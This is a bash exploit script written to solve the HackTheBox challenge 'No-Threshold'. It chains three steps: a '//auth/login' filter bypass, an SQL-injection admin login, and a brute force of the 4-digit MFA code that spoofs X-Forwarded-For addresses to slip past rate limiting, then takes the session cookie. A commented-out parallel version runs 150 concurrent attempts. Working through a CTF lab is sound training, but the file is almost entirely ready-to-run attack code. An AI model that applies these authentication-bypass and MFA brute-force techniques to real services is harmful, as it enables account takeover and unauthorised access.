#!/bin/bash
# Created this script to solve the HackTheBox challenge called No-Threshold

# Bypass filter on url format of /auth/login using file path manipulation of //auth/login , and login as admin using sql injection. 
curl -q -s http://127.0.0.1:1337//auth/login --data 'username=admin&password=%27or+1%3D1--+-' >/dev/null

# brute force MFA
for n in $(seq 1 9999);
do rip=`echo "$((RANDOM%199)).$((RANDOM%199)).$((RANDOM%99)).$((RANDOM%99))"`
rip=$(curl -s -i http://127.0.0.1:1337/auth/verify-2fa -X POST --data "2fa-code=$n" --header "X-Forwarded-For: $rip" --proxy "http://172.24.208.1:8080");
if [[ "$rip" =~ "dashboard" ]];
	then echo "$n";
	scookie=$(echo "$rip"|grep session|awk -F 'session=' '{print $2}'|awk -F ';' '{print $1}');
	break
		fi;
	done

# Finish login
curl -s -i http://127.0.0.1:1337/dashboard --cookie "session=$scookie"

:<<COMMENT - Alternative script below uses parallel to speed up the brute force 
#!/bin/bash
# Bypass filter on url format of /auth/login using file path manipulation of //auth/login , and login as admin using sql injection. 
perform_mfa_attempt() {
curl -q -s http://127.0.0.1:1337//auth/login --data 'username=admin&password=%27or+1%3D1--+-' >/dev/null

# Function to perform MFA brute force
    n=$1
    rip=$(curl -s -i http://127.0.0.1:1337/auth/verify-2fa -X POST --data "2fa-code=$n" --header "X-Forwarded-For: $((RANDOM%199)).$((RANDOM%199)).$((RANDOM%99)).$((RANDOM%99))" --proxy "http://172.24.208.1:8080")
    if [[ $rip == *dashboard* ]]; then
        echo "$n"
        scookie=$(echo "$rip" | grep session | awk -F 'session=' '{print $2}' | awk -F ';' '{print $1}')
	echo $scookie
	curl -s -i "http://127.0.0.1:1337/dashboard" --cookie "session=$scookie" --proxy "http://172.24.208.1:8080"
        exit 0  # Terminate all parallel processes
    fi
}

export -f perform_mfa_attempt

# Use parallel to perform MFA attempts
seq 1 9999 | parallel -j 150 perform_mfa_attempt {}
COMMENT
